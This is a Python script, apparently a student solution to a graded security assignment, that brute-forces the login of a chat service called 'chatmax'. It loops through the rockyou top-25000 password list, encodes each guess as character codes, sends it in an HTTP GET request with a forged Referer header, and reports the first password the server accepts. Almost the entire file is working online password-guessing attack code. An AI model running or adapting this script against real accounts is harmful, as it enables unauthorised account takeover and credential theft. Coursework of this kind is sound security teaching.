# network_cracker.py
#
# NOTE: Python 3 is used by default.
# You may use Python 2 by changing python3 to python2 in network_cracker.sh,
# as well as removing the parentheses from the main() function's print
# statements.
#
# If not using Python, see network_cracker.sh for instructions.
# (but please use Python, it is probably the easiest)
#
# ==== DEPENDENCIES ====
#
# The grading machine is guaranteed to have Python 2.7+, Python 3.4+, and the
# Python "requests" library. Please specify any other dependencies by adding
# their installation commands to setup.sh.
#
# By examining the requests that chatmax sends when it tries to log in, we
# replicate that functionality here. Once again, we loop through each password
# in the top 25000 and send that as a HTTP request to the server. If we receive
# an access forbidden, then we fail, but if it's ok, then we have cracked the password.

import sys
import requests
import random

def convert_to_num(password):
    return '-'.join([str(ord(x)) for x in list(password)])

# If succesful, returns the cracked password.
# If unsuccessful, returns None.
def crack(username, hostname, port):
    fin = open('data/rockyou-top-25000.txt', 'r')
    un_num = convert_to_num(username) + '.inbox'
    pws_tested = 0
    headers = {'Referer': 'http://{}:{}/home.html'.format(hostname, port)}
    for pw in fin.readlines():
        request_url = 'http://{}:{}/${:018d}?pw={}&un={}'.format(hostname, port, random.randint(0, int(1e18)), convert_to_num(pw.strip()), un_num)
        r = requests.get(request_url, headers = headers)
        if r.status_code == requests.codes.ok:
            return pw
        pws_tested += 1
        if pws_tested % 200 == 0:
            print(pws_tested)
    return None

# Do NOT change anything below (unless you are using Python 2, in which case
# only fix the print statement syntax).

def main():
    if len(sys.argv) != 4:
        print('Usage:', sys.argv[0], '<username>', '<hostname>', '<port>')
        sys.exit(1)

    username = sys.argv[1]
    hostname = sys.argv[2]
    port = int(sys.argv[3])
    cracked = crack(username, hostname, port)

    if not cracked:
        print('Cracking unsuccessful :(')
        sys.exit(1)

    print('Success! The cracked password is:')
    print(cracked)


if __name__ == '__main__':
    main()
